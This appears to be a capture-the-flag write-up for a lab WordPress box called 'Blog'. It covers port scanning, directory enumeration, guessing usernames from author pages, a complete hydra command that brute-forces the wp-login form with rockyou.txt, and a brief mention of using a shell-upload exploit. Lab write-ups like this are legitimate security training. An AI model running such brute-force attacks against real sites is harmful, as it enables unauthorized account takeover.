# Blog  
> Billy Joel made a Wordpress blog!  
> Make sure to add ```<your instance IP>  blog.thm``` to your /etc/hosts file  
### Iniital enumeration  

PORT SCAN
```
PORT    STATE SERVICE      REASON  
22/tcp  open  ssh          syn-ack ttl 63  
80/tcp  open  http         syn-ack ttl 63  
139/tcp open  netbios-ssn  syn-ack ttl 63  
445/tcp open  microsoft-ds syn-ack ttl 63  

```
Since this is a wordpress box, we'll use a tool like uniscan to automate directory and file discovery:  

```
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://blog.thm/admin/
| [+] CODE: 200 URL: http://blog.thm/embed/
| [+] CODE: 200 URL: http://blog.thm/feed/
| [+] CODE: 200 URL: http://blog.thm/login/
| [+] CODE: 200 URL: http://blog.thm/note/
| [+] CODE: 200 URL: http://blog.thm/rss/
| [+] CODE: 200 URL: http://blog.thm/welcome/
| [+] CODE: 200 URL: http://blog.thm/wp-admin/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://blog.thm/admin/index.php
| [+] CODE: 200 URL: http://blog.thm/favicon.ico
| [+] CODE: 200 URL: http://blog.thm/index.php
| [+] CODE: 200 URL: http://blog.thm/license.txt
| [+] CODE: 200 URL: http://blog.thm/readme.html
| [+] CODE: 200 URL: http://blog.thm/robots.txt
| [+] CODE: 200 URL: http://blog.thm/search/htx/SQLQHit.asp
| [+] CODE: 200 URL: http://blog.thm/search/htx/sqlqhit.asp
| [+] CODE: 200 URL: http://blog.thm/search/SQLQHit.asp
| [+] CODE: 200 URL: http://blog.thm/search/sqlqhit.asp
===================================================================================================
```
Looking at the blog, we see there's an author called Karen Wheeler.
![image](https://user-images.githubusercontent.com/65077960/124903055-793ffa80-dfdb-11eb-9fed-3f1ea59192a4.png)

Looking at the URL of her author page, we can see the username kwheel, we'll take a note of that as we may be able ot use that in futurue.
Following the syntax of her username, we can infer that Billy Joel's username is probably bjoel, let's try it.
![image](https://user-images.githubusercontent.com/65077960/124903691-1f8c0000-dfdc-11eb-9eaa-a8b369d632df.png)

So we have two usernames that we can potentially use. Let's try bruteforce kwheels' password.

```
hydra -l kwheel -P rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```
We have to specify the criteria of a failed attempt since Wordpress doesn't give us a HTTP code such as 403, it always returns 200.
![image](https://user-images.githubusercontent.com/65077960/124904699-2ebf7d80-dfdd-11eb-9533-6e1a755339d9.png)
  
After logging in, we can see there's not a great deal here. Let's take a step back and look at the wordpress version (5.0.0).
We can google the version and see associated exploits.
![image](https://user-images.githubusercontent.com/65077960/124905832-5531e880-dfde-11eb-8b30-d18f78c06c81.png)
Looking at exploitDB, we can see there's a shell upload vuln that we can use (now that we have credentials). Let's try it.

![image](https://user-images.githubusercontent.com/65077960/124906649-3122d700-dfdf-11eb-9cfb-2af2cd638b6f.png)
It worked, time to look for the user flag.



